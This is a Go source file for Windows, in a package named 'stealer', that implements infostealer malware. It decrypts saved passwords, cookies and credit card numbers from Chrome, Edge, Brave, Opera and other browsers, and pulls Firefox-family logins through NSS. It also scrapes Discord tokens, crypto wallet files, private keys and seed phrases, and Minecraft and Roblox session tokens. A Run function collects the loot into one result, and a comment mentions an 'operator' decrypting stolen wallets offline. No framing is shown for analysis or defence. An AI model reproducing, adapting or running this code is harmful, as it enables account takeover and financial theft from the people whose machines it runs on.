//go:build windows

package stealer

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

// ── Exported types ────────────────────────────────────────────────

type Credential struct {
	Browser  string `json:"browser"`
	Profile  string `json:"profile"`
	URL      string `json:"url"`
	Username string `json:"username"`
	Password string `json:"password"`
}

type Cookie struct {
	Browser  string `json:"browser"`
	Profile  string `json:"profile"`
	Host     string `json:"host"`
	Name     string `json:"name"`
	Value    string `json:"value"`
	Path     string `json:"path"`
	IsSecure bool   `json:"isSecure"`
}

type Card struct {
	Browser     string `json:"browser"`
	Profile     string `json:"profile"`
	Name        string `json:"name"`
	Number      string `json:"number"`
	ExpiryMonth int    `json:"expiryMonth"`
	ExpiryYear  int    `json:"expiryYear"`
}

type WalletFile struct {
	Wallet   string `json:"wallet"`
	Filename string `json:"filename"`
	DataB64  string `json:"dataB64"`
}

type GameToken struct {
	Game     string `json:"game"`
	Type     string `json:"type"`
	Username string `json:"username"`
	Value    string `json:"value"`
}

type Result struct {
	Credentials []Credential `json:"credentials"`
	Cookies     []Cookie     `json:"cookies"`
	Cards       []Card       `json:"cards"`
	Tokens      []string     `json:"tokens"`
	Wallets     []WalletFile `json:"wallets"`
	GameTokens  []GameToken  `json:"gameTokens"`
	Errors      []string     `json:"errors"`
}

// ── Windows DPAPI ─────────────────────────────────────────────────

var (
	modCrypt32         = syscall.NewLazyDLL("crypt32.dll")
	procCryptUnprotect = modCrypt32.NewProc("CryptUnprotectData")
	modKernel32Steal   = syscall.NewLazyDLL("kernel32.dll")
	procLocalFreeSteal = modKernel32Steal.NewProc("LocalFree")
)

type dataBlob struct {
	cbData uint32
	pbData *byte
}

func dpapi(ct []byte) ([]byte, error) {
	if len(ct) == 0 {
		return nil, fmt.Errorf("empty input")
	}
	in := dataBlob{cbData: uint32(len(ct)), pbData: &ct[0]}
	var out dataBlob
	r, _, err := procCryptUnprotect.Call(
		uintptr(unsafe.Pointer(&in)), 0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&out)),
	)
	if r == 0 {
		return nil, err
	}
	n := int(out.cbData)
	res := make([]byte, n)
	copy(res, unsafe.Slice(out.pbData, n))
	procLocalFreeSteal.Call(uintptr(unsafe.Pointer(out.pbData)))
	return res, nil
}

// ── Minimal SQLite3 reader (no external dependencies) ────────────

func sqReadVarint(b []byte) (int64, int) {
	var v int64
	for i := 0; i < 9 && i < len(b); i++ {
		if i == 8 {
			return (v << 8) | int64(b[8]), 9
		}
		v = (v << 7) | int64(b[i]&0x7F)
		if b[i]&0x80 == 0 {
			return v, i + 1
		}
	}
	return v, 1
}

func sqParseRecord(b []byte) []interface{} {
	if len(b) == 0 {
		return nil
	}
	hs, n := sqReadVarint(b)
	if int(hs) > len(b) || n == 0 {
		return nil
	}
	pos := n
	var types []int64
	for int64(pos) < hs {
		t, m := sqReadVarint(b[pos:])
		if m == 0 {
			break
		}
		types = append(types, t)
		pos += m
	}
	dp := int(hs)
	rec := make([]interface{}, len(types))
	for i, t := range types {
		var sz int
		switch {
		case t == 0, t == 8, t == 9, t == 10, t == 11:
			sz = 0
		case t >= 1 && t <= 4:
			sz = int(t)
		case t == 5:
			sz = 6
		case t == 6, t == 7:
			sz = 8
		case t >= 12 && t%2 == 0:
			sz = int((t - 12) / 2)
		case t >= 13 && t%2 == 1:
			sz = int((t - 13) / 2)
		}
		if dp+sz > len(b) {
			break
		}
		chunk := b[dp : dp+sz]
		switch {
		case t == 8:
			rec[i] = int64(0)
		case t == 9:
			rec[i] = int64(1)
		case t >= 1 && t <= 6:
			var v int64
			for _, c := range chunk {
				v = (v << 8) | int64(c)
			}
			if sz > 0 && sz < 8 && chunk[0]&0x80 != 0 {
				v |= -(int64(1) << (uint(sz) * 8))
			}
			rec[i] = v
		case t == 7:
			// float — not needed
		case t >= 12 && t%2 == 0:
			cp := make([]byte, sz)
			copy(cp, chunk)
			rec[i] = cp
		case t >= 13 && t%2 == 1:
			rec[i] = string(chunk)
		}
		dp += sz
	}
	return rec
}

func sqWalk(data []byte, pageSize, pageNum int) [][]byte {
	off := (pageNum - 1) * pageSize
	if off+pageSize > len(data) {
		return nil
	}
	page := data[off : off+pageSize]
	ho := 0
	if pageNum == 1 {
		ho = 100
	}
	if len(page) < ho+8 {
		return nil
	}
	ptype := page[ho]
	ncells := int(binary.BigEndian.Uint16(page[ho+3 : ho+5]))

	switch ptype {
	case 0x0D: // leaf table
		var out [][]byte
		for i := 0; i < ncells; i++ {
			cpoff := ho + 8 + i*2
			if cpoff+2 > len(page) {
				break
			}
			coff := int(binary.BigEndian.Uint16(page[cpoff : cpoff+2]))
			if coff >= len(page) {
				continue
			}
			psz, n1 := sqReadVarint(page[coff:])
			_, n2 := sqReadVarint(page[coff+n1:])
			s := coff + n1 + n2
			e := s + int(psz)
			if e > len(page) {
				e = len(page)
			}
			if s < e {
				pl := make([]byte, e-s)
				copy(pl, page[s:e])
				out = append(out, pl)
			}
		}
		return out

	case 0x05: // interior table
		if len(page) < ho+12 {
			return nil
		}
		rightmost := int(binary.BigEndian.Uint32(page[ho+8 : ho+12]))
		var out [][]byte
		for i := 0; i < ncells; i++ {
			cpoff := ho + 12 + i*2
			if cpoff+2 > len(page) {
				break
			}
			coff := int(binary.BigEndian.Uint16(page[cpoff : cpoff+2]))
			if coff+4 > len(page) {
				continue
			}
			left := int(binary.BigEndian.Uint32(page[coff : coff+4]))
			out = append(out, sqWalk(data, pageSize, left)...)
		}
		return append(out, sqWalk(data, pageSize, rightmost)...)
	}
	return nil
}

// sqOpenDB reads a SQLite file and returns (data, pageSize, error).
func sqOpenDB(path string) ([]byte, int, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, 0, err
	}
	if len(data) < 100 || string(data[:16]) != "SQLite format 3\x00" {
		return nil, 0, fmt.Errorf("not sqlite3")
	}
	ps := int(binary.BigEndian.Uint16(data[16:18]))
	if ps == 1 {
		ps = 65536
	}
	return data, ps, nil
}

// sqFindTable locates a table's root page and CREATE SQL from sqlite_master.
func sqFindTable(data []byte, ps int, tableName string) (rootPage int, createSQL string) {
	for _, pl := range sqWalk(data, ps, 1) {
		rec := sqParseRecord(pl)
		if len(rec) < 5 {
			continue
		}
		t, _ := rec[0].(string)
		name, _ := rec[1].(string)
		if t != "table" || !strings.EqualFold(name, tableName) {
			continue
		}
		rp, _ := rec[3].(int64)
		sql, _ := rec[4].(string)
		return int(rp), sql
	}
	return 0, ""
}

// sqColMap parses a CREATE TABLE statement and returns a map of column name → index.
func sqColMap(sql string) map[string]int {
	m := make(map[string]int)
	i := strings.Index(sql, "(")
	if i < 0 {
		return m
	}
	body := sql[i+1:]
	if j := strings.LastIndex(body, ")"); j > 0 {
		body = body[:j]
	}
	idx := 0
	for _, part := range strings.Split(body, ",") {
		part = strings.TrimSpace(part)
		if part == "" {
			continue
		}
		up := strings.ToUpper(part)
		if strings.HasPrefix(up, "UNIQUE") || strings.HasPrefix(up, "PRIMARY") || strings.HasPrefix(up, "CONSTRAINT") {
			continue
		}
		f := strings.Fields(part)
		if len(f) == 0 {
			continue
		}
		col := strings.ToLower(strings.Trim(f[0], "\"'`"))
		m[col] = idx
		idx++
	}
	return m
}

// ── Login Data (passwords) ────────────────────────────────────────

type loginRow struct {
	url      string
	username string
	encPass  []byte
}

func sqReadLogins(path string) ([]loginRow, error) {
	data, ps, err := sqOpenDB(path)
	if err != nil {
		return nil, err
	}
	root, sql := sqFindTable(data, ps, "logins")
	if root == 0 {
		return nil, fmt.Errorf("logins table not found")
	}
	cols := sqColMap(sql)
	urlIdx := colIdx(cols, "origin_url", 0)
	userIdx := colIdx(cols, "username_value", 3)
	passIdx := colIdx(cols, "password_value", 5)
	maxIdx := max3(urlIdx, userIdx, passIdx)

	var rows []loginRow
	for _, pl := range sqWalk(data, ps, root) {
		rec := sqParseRecord(pl)
		if len(rec) <= maxIdx {
			continue
		}
		url, _ := rec[urlIdx].(string)
		username, _ := rec[userIdx].(string)
		var ep []byte
		switch v := rec[passIdx].(type) {
		case []byte:
			ep = v
		case string:
			ep = []byte(v)
		}
		if url == "" && username == "" {
			continue
		}
		rows = append(rows, loginRow{url: url, username: username, encPass: ep})
	}
	return rows, nil
}

// ── Cookies ───────────────────────────────────────────────────────

type cookieRow struct {
	host     string
	name     string
	encValue []byte
	path     string
	isSecure bool
}

func sqReadCookies(path string) ([]cookieRow, error) {
	data, ps, err := sqOpenDB(path)
	if err != nil {
		return nil, err
	}
	root, sql := sqFindTable(data, ps, "cookies")
	if root == 0 {
		return nil, fmt.Errorf("cookies table not found")
	}
	cols := sqColMap(sql)
	hostIdx := colIdx(cols, "host_key", 1)
	nameIdx := colIdx(cols, "name", 3)
	encIdx := colIdx(cols, "encrypted_value", 5)
	pathIdx := colIdx(cols, "path", 6)
	secIdx := colIdx(cols, "is_secure", 8)
	maxIdx := max5(hostIdx, nameIdx, encIdx, pathIdx, secIdx)

	var rows []cookieRow
	for _, pl := range sqWalk(data, ps, root) {
		rec := sqParseRecord(pl)
		if len(rec) <= maxIdx {
			continue
		}
		host, _ := rec[hostIdx].(string)
		name, _ := rec[nameIdx].(string)
		path_, _ := rec[pathIdx].(string)
		var enc []byte
		switch v := rec[encIdx].(type) {
		case []byte:
			enc = v
		case string:
			enc = []byte(v)
		}
		var sec bool
		if sv, ok := rec[secIdx].(int64); ok {
			sec = sv != 0
		}
		if host == "" && name == "" {
			continue
		}
		rows = append(rows, cookieRow{host: host, name: name, encValue: enc, path: path_, isSecure: sec})
	}
	return rows, nil
}

// ── Credit Cards ──────────────────────────────────────────────────

type cardRow struct {
	name        string
	number      []byte
	expiryMonth int
	expiryYear  int
}

func sqReadCards(path string) ([]cardRow, error) {
	data, ps, err := sqOpenDB(path)
	if err != nil {
		return nil, err
	}
	root, sql := sqFindTable(data, ps, "credit_cards")
	if root == 0 {
		return nil, fmt.Errorf("credit_cards table not found")
	}
	cols := sqColMap(sql)
	nameIdx := colIdx(cols, "name_on_card", 1)
	monthIdx := colIdx(cols, "expiration_month", 2)
	yearIdx := colIdx(cols, "expiration_year", 3)
	numIdx := colIdx(cols, "card_number_encrypted", 4)
	maxIdx := max4(nameIdx, monthIdx, yearIdx, numIdx)

	var rows []cardRow
	for _, pl := range sqWalk(data, ps, root) {
		rec := sqParseRecord(pl)
		if len(rec) <= maxIdx {
			continue
		}
		name, _ := rec[nameIdx].(string)
		month, _ := rec[monthIdx].(int64)
		year, _ := rec[yearIdx].(int64)
		var enc []byte
		switch v := rec[numIdx].(type) {
		case []byte:
			enc = v
		case string:
			enc = []byte(v)
		}
		if name == "" && len(enc) == 0 {
			continue
		}
		rows = append(rows, cardRow{name: name, number: enc, expiryMonth: int(month), expiryYear: int(year)})
	}
	return rows, nil
}

// ── Chrome password/cookie/card decryption ────────────────────────

func getMasterKey(userDataPath string) ([]byte, error) {
	raw, err := os.ReadFile(filepath.Join(userDataPath, "Local State"))
	if err != nil {
		return nil, err
	}
	var ls struct {
		OSCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	if err := json.Unmarshal(raw, &ls); err != nil {
		return nil, err
	}
	b64, err := base64.StdEncoding.DecodeString(ls.OSCrypt.EncryptedKey)
	if err != nil {
		return nil, err
	}
	if len(b64) <= 5 {
		return nil, fmt.Errorf("key too short")
	}
	return dpapi(b64[5:]) // strip "DPAPI" prefix
}

func decryptValue(masterKey, enc []byte) string {
	if len(enc) < 3 {
		return ""
	}
	if string(enc[:3]) == "v10" || string(enc[:3]) == "v20" {
		if len(enc) < 3+12+16 {
			return ""
		}
		block, err := aes.NewCipher(masterKey)
		if err != nil {
			return ""
		}
		gcm, err := cipher.NewGCM(block)
		if err != nil {
			return ""
		}
		plain, err := gcm.Open(nil, enc[3:15], enc[15:], nil)
		if err != nil {
			return ""
		}
		return string(plain)
	}
	plain, err := dpapi(enc)
	if err != nil {
		return ""
	}
	return string(plain)
}

// ── Browser definitions ───────────────────────────────────────────

type browserDef struct{ name, path string }

func browserDefs() []browserDef {
	local := os.Getenv("LOCALAPPDATA")
	roam := os.Getenv("APPDATA")
	return []browserDef{
		{"Chrome", filepath.Join(local, `Google\Chrome\User Data`)},
		{"Edge", filepath.Join(local, `Microsoft\Edge\User Data`)},
		{"Brave", filepath.Join(local, `BraveSoftware\Brave-Browser\User Data`)},
		{"Chromium", filepath.Join(local, `Chromium\User Data`)},
		{"Opera GX", filepath.Join(roam, `Opera Software\Opera GX Stable`)},
		{"Opera", filepath.Join(roam, `Opera Software\Opera Stable`)},
		{"Vivaldi", filepath.Join(local, `Vivaldi\User Data`)},
		{"Yandex", filepath.Join(local, `Yandex\YandexBrowser\User Data`)},
	}
}

var browserProfiles = []string{
	"Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5",
}

func cpFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, in)
	return err
}

// ── Chromium passwords ────────────────────────────────────────────

func stealBrowser(b browserDef, key []byte) []Credential {
	var creds []Credential
	for _, profile := range browserProfiles {
		src := filepath.Join(b.path, profile, "Login Data")
		if _, err := os.Stat(src); err != nil {
			continue
		}
		tmp := filepath.Join(os.TempDir(), fmt.Sprintf("ol_%x.tmp", time.Now().UnixNano()))
		if err := cpFile(src, tmp); err != nil {
			continue
		}
		rows, err := sqReadLogins(tmp)
		os.Remove(tmp)
		if err != nil {
			continue
		}
		for _, r := range rows {
			pass := decryptValue(key, r.encPass)
			if pass == "" {
				continue
			}
			creds = append(creds, Credential{
				Browser:  b.name,
				Profile:  profile,
				URL:      r.url,
				Username: r.username,
				Password: pass,
			})
		}
	}
	return creds
}

// ── Chromium cookies ──────────────────────────────────────────────

func stealBrowserCookies(b browserDef, key []byte) []Cookie {
	var cookies []Cookie
	for _, profile := range browserProfiles {
		// Chrome moved Cookies into Network/ subdirectory; check both locations.
		candidates := []string{
			filepath.Join(b.path, profile, "Network", "Cookies"),
			filepath.Join(b.path, profile, "Cookies"),
		}
		var src string
		for _, c := range candidates {
			if _, err := os.Stat(c); err == nil {
				src = c
				break
			}
		}
		if src == "" {
			continue
		}
		tmp := filepath.Join(os.TempDir(), fmt.Sprintf("olc_%x.tmp", time.Now().UnixNano()))
		if err := cpFile(src, tmp); err != nil {
			continue
		}
		rows, err := sqReadCookies(tmp)
		os.Remove(tmp)
		if err != nil {
			continue
		}
		for _, r := range rows {
			value := decryptValue(key, r.encValue)
			if value == "" {
				continue
			}
			cookies = append(cookies, Cookie{
				Browser:  b.name,
				Profile:  profile,
				Host:     r.host,
				Name:     r.name,
				Value:    value,
				Path:     r.path,
				IsSecure: r.isSecure,
			})
		}
	}
	return cookies
}

// ── Chromium credit cards ─────────────────────────────────────────

func stealBrowserCards(b browserDef, key []byte) []Card {
	var cards []Card
	for _, profile := range browserProfiles {
		src := filepath.Join(b.path, profile, "Web Data")
		if _, err := os.Stat(src); err != nil {
			continue
		}
		tmp := filepath.Join(os.TempDir(), fmt.Sprintf("olw_%x.tmp", time.Now().UnixNano()))
		if err := cpFile(src, tmp); err != nil {
			continue
		}
		rows, err := sqReadCards(tmp)
		os.Remove(tmp)
		if err != nil {
			continue
		}
		for _, r := range rows {
			number := decryptValue(key, r.number)
			if number == "" {
				continue
			}
			cards = append(cards, Card{
				Browser:     b.name,
				Profile:     profile,
				Name:        r.name,
				Number:      number,
				ExpiryMonth: r.expiryMonth,
				ExpiryYear:  r.expiryYear,
			})
		}
	}
	return cards
}

// ── Gecko/Firefox (NSS) ───────────────────────────────────────────

// secItem mirrors the NSS SECItem struct on 64-bit Windows.
// Layout: uint32 type, [4 pad], *byte data, uint32 len
type secItem struct {
	itemType uint32
	_        [4]byte
	data     *byte
	length   uint32
}

func nssDecrypt(pk11Decrypt, secItemFree *syscall.LazyProc, encoded string) string {
	raw, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil || len(raw) == 0 {
		return ""
	}
	in := secItem{itemType: 0, data: &raw[0], length: uint32(len(raw))}
	var out secItem
	r, _, _ := pk11Decrypt.Call(
		uintptr(unsafe.Pointer(&in)),
		uintptr(unsafe.Pointer(&out)),
		0,
	)
	if r != 0 {
		return ""
	}
	if out.data == nil || out.length == 0 {
		return ""
	}
	result := make([]byte, out.length)
	copy(result, unsafe.Slice(out.data, out.length))
	secItemFree.Call(uintptr(unsafe.Pointer(&out)), 0)
	return string(result)
}

type geckoBrowser struct{ name, profilesDir string }

func geckoBrowsers() []geckoBrowser {
	roam := os.Getenv("APPDATA")
	return []geckoBrowser{
		{"Firefox", filepath.Join(roam, `Mozilla\Firefox\Profiles`)},
		{"Thunderbird", filepath.Join(roam, `Thunderbird\Profiles`)},
		{"LibreWolf", filepath.Join(roam, `LibreWolf\Profiles`)},
		{"Waterfox", filepath.Join(roam, `Waterfox\Profiles`)},
		{"Pale Moon", filepath.Join(roam, `Moonchild Productions\Pale Moon\Profiles`)},
	}
}

func findNSS3() string {
	candidates := []string{
		`C:\Program Files\Mozilla Firefox\nss3.dll`,
		`C:\Program Files (x86)\Mozilla Firefox\nss3.dll`,
		`C:\Program Files\LibreWolf\nss3.dll`,
		`C:\Program Files (x86)\LibreWolf\nss3.dll`,
		`C:\Program Files\Waterfox\nss3.dll`,
		`C:\Program Files (x86)\Waterfox\nss3.dll`,
	}
	for _, p := range candidates {
		if _, err := os.Stat(p); err == nil {
			return p
		}
	}
	return ""
}

func stealGecko() ([]Credential, []string) {
	nssPath := findNSS3()
	if nssPath == "" {
		return nil, nil // no Firefox-family browser installed
	}

	nss3 := syscall.NewLazyDLL(nssPath)
	nssInit := nss3.NewProc("NSS_Init")
	nssShutdown := nss3.NewProc("NSS_Shutdown")
	pk11GetSlot := nss3.NewProc("PK11_GetInternalKeySlot")
	pk11CheckPass := nss3.NewProc("PK11_CheckUserPassword")
	pk11FreeSlot := nss3.NewProc("PK11_FreeSlot")
	pk11Decrypt := nss3.NewProc("PK11_SDR_Decrypt")
	secItemFree := nss3.NewProc("SECITEM_FreeItem")

	var creds []Credential
	var errs []string

	for _, b := range geckoBrowsers() {
		entries, err := os.ReadDir(b.profilesDir)
		if err != nil {
			continue
		}
		for _, e := range entries {
			if !e.IsDir() {
				continue
			}
			profilePath := filepath.Join(b.profilesDir, e.Name())
			loginsPath := filepath.Join(profilePath, "logins.json")
			if _, err := os.Stat(loginsPath); err != nil {
				continue
			}

			profileC, err := syscall.BytePtrFromString(profilePath)
			if err != nil {
				continue
			}
			r, _, _ := nssInit.Call(uintptr(unsafe.Pointer(profileC)))
			if r != 0 {
				errs = append(errs, fmt.Sprintf("%s/%s: NSS_Init failed", b.name, e.Name()))
				continue
			}

			slot, _, _ := pk11GetSlot.Call()
			if slot != 0 {
				emptyC, _ := syscall.BytePtrFromString("")
				pk11CheckPass.Call(slot, uintptr(unsafe.Pointer(emptyC)))
			}

			loginsData, err := os.ReadFile(loginsPath)
			if err == nil {
				var lf struct {
					Logins []struct {
						Hostname          string `json:"hostname"`
						EncryptedUsername string `json:"encryptedUsername"`
						EncryptedPassword string `json:"encryptedPassword"`
					} `json:"logins"`
				}
				if json.Unmarshal(loginsData, &lf) == nil {
					for _, login := range lf.Logins {
						username := nssDecrypt(pk11Decrypt, secItemFree, login.EncryptedUsername)
						password := nssDecrypt(pk11Decrypt, secItemFree, login.EncryptedPassword)
						if username == "" && password == "" {
							continue
						}
						creds = append(creds, Credential{
							Browser:  b.name,
							Profile:  e.Name(),
							URL:      login.Hostname,
							Username: username,
							Password: password,
						})
					}
				}
			}

			if slot != 0 {
				pk11FreeSlot.Call(slot)
			}
			nssShutdown.Call()
		}
	}
	return creds, errs
}

// ── Discord token extraction ──────────────────────────────────────

var tokenRe = regexp.MustCompile(`[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,}`)

func stealDiscord() []string {
	roam := os.Getenv("APPDATA")
	dirs := []string{
		filepath.Join(roam, `discord\Local Storage\leveldb`),
		filepath.Join(roam, `discordcanary\Local Storage\leveldb`),
		filepath.Join(roam, `discordptb\Local Storage\leveldb`),
	}
	seen := make(map[string]struct{})
	var tokens []string
	for _, dir := range dirs {
		entries, err := os.ReadDir(dir)
		if err != nil {
			continue
		}
		for _, e := range entries {
			n := e.Name()
			if !strings.HasSuffix(n, ".ldb") && !strings.HasSuffix(n, ".log") {
				continue
			}
			data, err := os.ReadFile(filepath.Join(dir, n))
			if err != nil {
				continue
			}
			for _, m := range tokenRe.FindAll(data, -1) {
				t := string(m)
				if _, dup := seen[t]; !dup {
					seen[t] = struct{}{}
					tokens = append(tokens, t)
				}
			}
		}
	}
	return tokens
}

// ── Crypto wallets ────────────────────────────────────────────────

var (
	ethPrivKeyRe = regexp.MustCompile(`(?i)[0-9a-f]{64}`)
	wifKeyRe     = regexp.MustCompile(`[5KLc][1-9A-HJ-NP-Za-km-z]{50,51}`)
	// Atomic / Electrum store seeds in JSON; grab anything that looks like
	// a 12 or 24-word mnemonic (space-separated lowercase words 3-8 chars).
	seedPhraseRe = regexp.MustCompile(`[a-z]{3,8}(?: [a-z]{3,8}){11}(?:(?: [a-z]{3,8}){11})?`)
)

// stealExodus grabs the encrypted wallet files from the Exodus desktop wallet.
// The .seco files are AES-GCM encrypted; the operator can attempt decryption
// offline (default Exodus install has no passphrase, key derivable from appdata).
func stealExodus() []WalletFile {
	roam := os.Getenv("APPDATA")
	walletDir := filepath.Join(roam, `Exodus\exodus.wallet`)
	entries, err := os.ReadDir(walletDir)
	if err != nil {
		return nil
	}
	var files []WalletFile
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		name := e.Name()
		// Grab seed/passphrase/key files; skip large asset caches
		ext := strings.ToLower(filepath.Ext(name))
		if ext != ".seco" && ext != ".json" && ext != ".seed" {
			continue
		}
		fullPath := filepath.Join(walletDir, name)
		data, err := os.ReadFile(fullPath)
		if err != nil || len(data) == 0 || len(data) > 256*1024 {
			continue
		}
		files = append(files, WalletFile{
			Wallet:   "Exodus",
			Filename: name,
			DataB64:  base64.StdEncoding.EncodeToString(data),
		})
	}
	return files
}

// stealAtomic scans Atomic Wallet's LevelDB for private keys and seed phrases.
func stealAtomic() []WalletFile {
	roam := os.Getenv("APPDATA")
	dirs := []string{
		filepath.Join(roam, `atomic\Local Storage\leveldb`),
		filepath.Join(roam, `atomic wallet\Local Storage\leveldb`),
	}
	seen := make(map[string]struct{})
	var results []WalletFile
	for _, dir := range dirs {
		entries, err := os.ReadDir(dir)
		if err != nil {
			continue
		}
		for _, e := range entries {
			n := e.Name()
			if !strings.HasSuffix(n, ".ldb") && !strings.HasSuffix(n, ".log") {
				continue
			}
			data, err := os.ReadFile(filepath.Join(dir, n))
			if err != nil {
				continue
			}
			// Extract ETH private keys, WIF keys, and seed phrases
			for _, m := range ethPrivKeyRe.FindAll(data, -1) {
				k := strings.ToLower(string(m))
				if _, dup := seen[k]; !dup {
					seen[k] = struct{}{}
					results = append(results, WalletFile{Wallet: "Atomic", Filename: "eth_key", DataB64: base64.StdEncoding.EncodeToString(m)})
				}
			}
			for _, m := range wifKeyRe.FindAll(data, -1) {
				k := string(m)
				if _, dup := seen[k]; !dup {
					seen[k] = struct{}{}
					results = append(results, WalletFile{Wallet: "Atomic", Filename: "wif_key", DataB64: base64.StdEncoding.EncodeToString(m)})
				}
			}
			for _, m := range seedPhraseRe.FindAll(data, -1) {
				k := string(m)
				if _, dup := seen[k]; !dup {
					seen[k] = struct{}{}
					results = append(results, WalletFile{Wallet: "Atomic", Filename: "seed", DataB64: base64.StdEncoding.EncodeToString(m)})
				}
			}
		}
	}
	return results
}

// ── Entry point ───────────────────────────────────────────────────

// ── Minecraft session stealer ─────────────────────────────────────

// mcAccountsJSON extracts tokens from a launcher_accounts.json style file.
func mcAccountsJSON(data []byte, launcher string) []GameToken {
	var out []GameToken
	var j map[string]interface{}
	if json.Unmarshal(data, &j) != nil {
		return out
	}
	accounts, _ := j["accounts"].(map[string]interface{})
	for _, v := range accounts {
		acc, _ := v.(map[string]interface{})
		if acc == nil {
			continue
		}
		token, _ := acc["accessToken"].(string)
		username := ""
		if profile, ok := acc["minecraftProfile"].(map[string]interface{}); ok {
			username, _ = profile["name"].(string)
		}
		if username == "" {
			username, _ = acc["username"].(string)
		}
		if token != "" {
			out = append(out, GameToken{Game: launcher, Type: "AccessToken", Username: username, Value: token})
		}
	}
	return out
}

// mcProfilesJSON extracts tokens from a legacy launcher_profiles.json style file.
func mcProfilesJSON(data []byte, launcher string) []GameToken {
	var out []GameToken
	var j map[string]interface{}
	if json.Unmarshal(data, &j) != nil {
		return out
	}
	authDB, _ := j["authenticationDatabase"].(map[string]interface{})
	for _, v := range authDB {
		entry, _ := v.(map[string]interface{})
		if entry == nil {
			continue
		}
		token, _ := entry["accessToken"].(string)
		username, _ := entry["username"].(string)
		if token != "" {
			out = append(out, GameToken{Game: launcher, Type: "LegacyAccessToken", Username: username, Value: token})
		}
	}
	return out
}

func stealMinecraft() []GameToken {
	var out []GameToken
	appdata := os.Getenv("APPDATA")
	localAppdata := os.Getenv("LOCALAPPDATA")
	if appdata == "" {
		return out
	}

	type launcherDef struct {
		name         string
		accountsPath string // launcher_accounts.json style
		profilesPath string // launcher_profiles.json style (legacy)
	}

	launchers := []launcherDef{
		// Official launcher
		{
			name:         "Minecraft",
			accountsPath: filepath.Join(appdata, ".minecraft", "launcher_accounts.json"),
			profilesPath: filepath.Join(appdata, ".minecraft", "launcher_profiles.json"),
		},
		// Lunar Client
		{
			name:         "LunarClient",
			accountsPath: filepath.Join(appdata, ".lunarclient", "settings", "game", "accounts.json"),
		},
		// Badlion Client
		{
			name:         "Badlion",
			accountsPath: filepath.Join(appdata, "Badlion Client", "accounts.json"),
		},
		// Feather Client
		{
			name:         "Feather",
			accountsPath: filepath.Join(appdata, "feather-client", "accounts.json"),
		},
		// Prism Launcher
		{
			name:         "Prism",
			accountsPath: filepath.Join(appdata, "PrismLauncher", "accounts.json"),
		},
		// ATLauncher
		{
			name:         "ATLauncher",
			accountsPath: filepath.Join(localAppdata, "ATLauncher", "accounts.json"),
		},
	}

	for _, l := range launchers {
		if l.accountsPath != "" {
			if data, err := os.ReadFile(l.accountsPath); err == nil {
				out = append(out, mcAccountsJSON(data, l.name)...)
			}
		}
		if l.profilesPath != "" {
			if data, err := os.ReadFile(l.profilesPath); err == nil {
				out = append(out, mcProfilesJSON(data, l.name)...)
			}
		}
	}

	return out
}

// ── Roblox cookie stealer ─────────────────────────────────────────

func stealRoblox(cookies []Cookie) []GameToken {
	var out []GameToken
	seen := map[string]bool{}
	// Extract .ROBLOSECURITY from already-collected browser cookies
	for _, c := range cookies {
		if c.Name == ".ROBLOSECURITY" && !seen[c.Value] {
			seen[c.Value] = true
			out = append(out, GameToken{
				Game:     "Roblox",
				Type:     ".ROBLOSECURITY",
				Username: c.Browser + "/" + c.Profile,
				Value:    c.Value,
			})
		}
	}
	// Also check Roblox app local storage (Windows UWP / desktop)
	localAppData := os.Getenv("LOCALAPPDATA")
	if localAppData != "" {
		candidates := []string{
			filepath.Join(localAppData, "Roblox", "LocalStorage", "RobloxCookies.dat"),
			filepath.Join(localAppData, "Packages", "ROBLOXCORPORATION.ROBLOX_55nm5eh3cm0pr", "LocalState", "RobloxCookies.dat"),
		}
		for _, p := range candidates {
			data, err := os.ReadFile(p)
			if err != nil {
				continue
			}
			re := regexp.MustCompile(`_\|WARNING:-DO-NOT-SHARE-THIS[^"'\s]+`)
			for _, match := range re.FindAll(data, -1) {
				val := string(match)
				if !seen[val] {
					seen[val] = true
					out = append(out, GameToken{Game: "Roblox", Type: ".ROBLOSECURITY", Username: "RobloxApp", Value: val})
				}
			}
		}
	}
	return out
}

func Run() Result {
	r := Result{}
	for _, b := range browserDefs() {
		if _, err := os.Stat(b.path); err != nil {
			continue
		}
		key, err := getMasterKey(b.path)
		if err != nil {
			r.Errors = append(r.Errors, b.name+": "+err.Error())
			continue
		}
		r.Credentials = append(r.Credentials, stealBrowser(b, key)...)
		r.Cookies = append(r.Cookies, stealBrowserCookies(b, key)...)
		r.Cards = append(r.Cards, stealBrowserCards(b, key)...)
	}

	geckoCreds, geckoErrs := stealGecko()
	r.Credentials = append(r.Credentials, geckoCreds...)
	r.Errors = append(r.Errors, geckoErrs...)

	r.Tokens = stealDiscord()
	r.Wallets = append(r.Wallets, stealExodus()...)
	r.Wallets = append(r.Wallets, stealAtomic()...)
	r.GameTokens = append(r.GameTokens, stealMinecraft()...)
	r.GameTokens = append(r.GameTokens, stealRoblox(r.Cookies)...)
	return r
}

// ── Helpers ───────────────────────────────────────────────────────

func colIdx(m map[string]int, name string, fallback int) int {
	if i, ok := m[name]; ok {
		return i
	}
	return fallback
}

func max3(a, b, c int) int {
	if b > a {
		a = b
	}
	if c > a {
		a = c
	}
	return a
}

func max4(a, b, c, d int) int {
	return max3(max3(a, b, c), d, d)
}

func max5(a, b, c, d, e int) int {
	return max3(max4(a, b, c, d), e, e)
}
